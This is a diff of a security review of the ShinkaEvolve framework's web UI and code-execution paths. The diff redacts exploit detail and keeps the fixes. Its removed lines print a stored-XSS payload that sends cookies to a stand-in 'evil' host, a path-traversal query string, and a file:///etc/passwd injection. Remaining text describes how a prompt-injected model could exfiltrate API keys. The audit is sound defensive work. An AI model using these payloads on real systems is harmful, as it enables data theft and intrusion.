@@ -6,6 +6,9 @@
 
 > ShinkaEvolve is a research framework for LLM-driven evolutionary program search. It queries LLM APIs, writes generated programs to disk, **executes them locally or via Slurm**, stores results in SQLite, and serves a web UI for visualization. This execution-of-generated-code model is intentional and shapes the security analysis below.
 
+!!! warning "Security disclosure status"
+    This historical review covers security defects that were present in the reviewed revision. Detailed exploitation steps are intentionally omitted while the corresponding hardening is not on `main`. Until those mitigations land, keep the Web UI bound to trusted interfaces and treat generated-code evaluation as privileged execution.
+
 ---
 
 ## Executive summary
@@ -37,18 +40,17 @@ The security posture is **good on fundamentals but weak at the web-UI boundary a
 ### High severity
 
 **S1 — Visualization server: binds all interfaces, no auth, CORS `*`, + path traversal → unauthenticated arbitrary SQLite/file read.** `shinka/webui/visualization.py`.
-- Binds `0.0.0.0`: `ReusableTCPServer(("", port), ...)` at **1740** (banner at 1741 confirms). Every endpoint is unauthenticated.
-- CORS wildcard: `send_header("Access-Control-Allow-Origin", "*")` at **1681** on all JSON responses.
-- Path traversal: the `db_path` query param is used verbatim — `_get_actual_db_path` is a **verified no-op** (**428–430**, `return db_path`) and every handler does `os.path.join(self.search_root, db_path)` (**449, 546, 616, 694, 785, 843, 891, 948, 1035, 1134**). Because `os.path.join(root, "/abs")` discards `root`, `?db_path=/home/victim/secret.db` (or `../`) opens **any SQLite DB on the host** and returns its contents; `handle_get_meta_content` likewise `open()`s `meta_*.txt` outside root (843–859).
-- Combined impact: anyone on the LAN — or, via CORS/DNS-rebinding, a web page the operator visits — can enumerate and exfiltrate arbitrary SQLite databases and text files from the host.
+- The server listens on every interface and does not authenticate requests.
+- JSON responses allow requests from arbitrary origins.
+- User-supplied database paths are joined to the configured search root without canonicalization or containment checks.
+- Combined impact: an untrusted network client or browser origin may reach data outside the intended search root. Exploit construction is omitted pending remediation.
 - **Fix:** default-bind `127.0.0.1`, make external exposure an explicit `--host` opt-in paired with an auth token; drop the CORS wildcard; add one shared path guard that rejects absolute/`..`, canonicalizes via `os.path.realpath`, and enforces `os.path.commonpath([resolved, realpath(search_root)]) == realpath(search_root)`; validate `processed_count` as `int` before interpolation.
 
 **S2 — Stored XSS: LLM-generated content rendered as raw HTML.** `shinka/webui/viz_tree.html`. The page loads `marked` (unpinned, line 2077) and renders attacker-influenced DB fields **without any sanitizer** (DOMPurify count = 0):
-- `6009` `marked.parse(data.metadata.thought)` → `nodeDetailsContainer.innerHTML` (6022) — the LLM "thought" becomes live HTML.
-- `2868/2872`, `3073/3076/3134/3148–3160` — meta-analysis text/insights/diff via `marked.parse` → `innerHTML` (3042).
-- Independently of `marked`, raw DB fields are interpolated into `innerHTML`: `5693` `agentName`/`patch_name`, `5697` `data.error`, `8177` `patchName`, `8186` `model`, `17656/17660` prompt `name`/`description`. Inconsistent — sibling fields like `statusLabel` (8176) and `prompt_text` (17707) *are* escaped.
-- **Amplifier:** three `escapeHtml` definitions exist (3204, 6194, 18006); JS hoisting makes the **last win** — the variant that escapes `& < >` but **not `"`/`'`**, so every attribute-context use is still open to attribute breakout (e.g. reflected via `?db_path=` at `3989` `onclick="loadDatabase('${dbPath}')"`).
-- Payload: an evolved program or prompt-injected model emitting `<img src=x onerror=fetch('http://evil/?'+document.cookie)>` in any LLM field runs when the operator opens the node — and that script can then hit the S1 endpoints.
+- Several Markdown-rendered LLM fields flow into `innerHTML` without sanitization.
+- Other database fields are interpolated directly into HTML, including attribute contexts.
+- Multiple inconsistent escaping helpers leave some contexts insufficiently escaped.
+- Combined with S1, injected script can access data available to the visualization session. Payload details are omitted pending remediation.
 - **Fix:** route every `marked.parse` output through `DOMPurify.sanitize`; HTML-escape all interpolated untrusted fields; consolidate to one quote-escaping `escapeHtml`; build `on*` handlers via `addEventListener`, not string interpolation; pin `marked`.
 
 **S3 — (By-design, under-mitigated) Evolved code executes with no sandbox in `local` mode, inheriting the full environment including all API keys.** `wrap_eval.py:load_program` (29–37) `importlib` + `exec_module` on the LLM-written file; `local.py` starts the eval with `env = os.environ.copy()` (98) passed as `env=env` (112). The evolved program therefore inherits **every** provider secret in the environment. A prompt-injected or adversarial model can emit code that exfiltrates all keys or reads the filesystem, with no isolation in `local` mode (only the optional Slurm/Docker paths isolate, and even those inherit secrets via `eval_env`). This is intentional, but the trust boundary is undocumented and the env is un-scoped.
@@ -56,8 +58,8 @@ The security posture is **good on fundamentals but weak at the web-UI boundary a
 
 ### Medium severity
 - **S4 — Shell command construction via unescaped f-strings** in `slurm.py` (`_render_env_exports` :20, `_render_env_docker_flags` :27, `submit_local_docker`/`submit_local_conda` `bash -lc` strings at 440–449/482–493, `.format()` sbatch scripts at 240–274/329–354). Operator-config-controlled today (not a remote vector), but any `eval_env` value derived from untrusted data would inject shell. **Fix:** `shlex.quote` all interpolated values; prefer argv lists / Docker `--env-file`.
-- **S5 — PDF export renders untrusted LLM HTML through `wkhtmltopdf`** without `--disable-local-file-access`/`--disable-javascript` (`visualization.py:_generate_pdf`, subprocess at 1510; WebKit loads `file://` and remote URLs). `<img src="file:///etc/passwd">` in meta content → local-file disclosure / SSRF into the PDF. **Fix:** sanitize the HTML (bleach allow-list) and pass the disable flags.
-- **S6 — `/plot_file/` containment is weak.** `handle_serve_plot_file` (981–1025) checks `abs_path.startswith(abs_search_root)` using `os.path.abspath` (not `realpath`) with **no trailing separator** and **after** the existence check — sibling dir `<root>_bak` bypasses, in-root symlinks (which LLM programs can create) are followed, and any extension is streamed. **Fix:** `realpath` + `commonpath`, restrict to image extensions, check before touching the file.
+- **S5 — PDF export renders untrusted LLM HTML through `wkhtmltopdf`** without explicitly disabling local-file access or JavaScript (`visualization.py:_generate_pdf`). This creates version-dependent local-resource and network-request risks. **Fix:** sanitize the HTML (bleach allow-list) and pass the disable flags.
+- **S6 — `/plot_file/` containment is weak.** `handle_serve_plot_file` uses a string-prefix check on absolute paths rather than canonical path containment, and follows symlinks. **Fix:** `realpath` + `commonpath`, restrict to image extensions, check before touching the file.
 - **S7 — 9–10 third-party scripts loaded from CDNs with no SRI** (`viz_tree.html:2075–2084`, `compare.html:8`); `marked` and `plotly` are unpinned (`latest`). CDN compromise or version drift injects arbitrary JS into the session that handles the DB. **Fix:** pin exact versions + add SRI hashes, or vendor locally.
 
 ### Low / informational
@@ -68,7 +70,6 @@ The security posture is **good on fundamentals but weak at the web-UI boundary a
 - `pickle.load` of bandit state (`prioritization.py:220`) — local-trust; RCE only if an attacker plants the pickle.
 - `env.py` `load_dotenv(override=True)` (26) lets a package-root `.env` shadow real environment variables; consider `override=False`.
 - `claude.yml` triggers `claude-code-action` on `@claude` from any GitHub user (prompt-injection / billing-DoS surface); read-only permissions limit blast radius — consider restricting to members.
-- **Operational (not a code finding):** the working tree's `.env` holds live third-party API keys. Correctly gitignored and not in history, but worth rotating if this tree was ever shared or backed up.
 
 ---
 
